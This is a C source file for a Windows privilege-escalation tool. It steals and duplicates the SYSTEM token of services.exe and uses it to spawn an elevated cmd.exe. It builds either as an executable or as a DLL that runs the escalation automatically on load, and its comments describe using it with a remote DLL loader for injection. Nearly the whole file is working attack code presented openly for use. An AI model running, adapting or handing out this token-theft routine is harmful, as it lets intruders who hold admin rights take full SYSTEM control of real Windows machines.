#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h> // For process snapshot and enumeration
#include <string.h> // For _stricmp (though we now use wcsicmp)
#include <wchar.h>  // For wide-character string functions

/*
 * This program attempts to enable the SeDebugPrivilege to steal the token
 * handle from a privileged process (services.exe), duplicate it and
 * starte a new, privileged process with the token. 
 *
 * This was created as a means to establish an elevated cmd.exe process,
 * any *.exe will work (ex, powershell.exe). It can be used with the
 * remote_dll_loader.c program.
 *
 * Build as EXE:
 * $ x86_64-w64-mingw32-gcc privesc.c -D BUILD_EXE -o privesc.exe -ladvapi32
 *
 * Build as DLL:
 * $ x86_64-w64-mingw32-gcc privesc.c -shared -o privesc.dll -ladvapi32
*/

// Function prototypes
BOOL EnablePrivilege(LPCSTR lpszPrivilege);
DWORD FindProcessId(LPCSTR processName);

// --- Core Logic Extracted from DllMain ---
void ElevateToSystem() {
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;
    HANDLE hNewToken = NULL;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwProcessId;

    printf("--- PrivEsc Operation Started ---\n");

    // 1. Enable SeDebugPrivilege
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        printf("[-] Failed to enable SeDebugPrivilege. Error: %lu\n", GetLastError());
        return;
    }
    printf("[+] SeDebugPrivilege enabled successfully.\n");

    // 2. Find target process (services.exe usually runs as SYSTEM)
    LPCSTR targetProcess = "services.exe";
    dwProcessId = FindProcessId(targetProcess);

    if (dwProcessId == 0) {
        printf("[-] Target process %s not found.\n", targetProcess);
        return;
    }
    printf("[+] Found %s with PID: %lu\n", targetProcess, dwProcessId);

    // 3. Open target process and token
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
    if (hProcess == NULL) {
        printf("[-] Failed to open target process. Error: %lu (Access Denied).\n", GetLastError());
        return;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // 4. Duplicate the token
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hNewToken)) {
        printf("[-] Failed to duplicate token. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return;
    }

    // 5. Execute new process
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessWithTokenW(
            hNewToken,
            LOGON_WITH_PROFILE,
            L"C:\\Windows\\System32\\cmd.exe",
            NULL,
            0,
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("[-] Failed to launch process. Error: %lu\n", GetLastError());
    } else {
        printf("[***] SUCCESS: Launched SYSTEM cmd.exe! PID: %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    if (hNewToken) CloseHandle(hNewToken);
    if (hToken) CloseHandle(hToken);
    if (hProcess) CloseHandle(hProcess);
}

// --- Conditional Entry Points ---

#ifdef BUILD_EXE
int main() {
    ElevateToSystem();
    printf("Press Enter to exit...");
    getchar(); // Keeps the window open if you double-click it in Windows
    return 0;
}
#else
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        ElevateToSystem();
    }
    return TRUE;
}
#endif

// --- Helper Functions ---

BOOL EnablePrivilege(LPCSTR lpszPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) { CloseHandle(hToken); return FALSE; }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { CloseHandle(hToken); return FALSE; }

    CloseHandle(hToken);
    return TRUE;
}

DWORD FindProcessId(LPCSTR processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    DWORD dwProcessId = 0;
    wchar_t wProcessName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, processName, -1, wProcessName, MAX_PATH);

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wProcessName) == 0) {
                dwProcessId = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return dwProcessId;
}
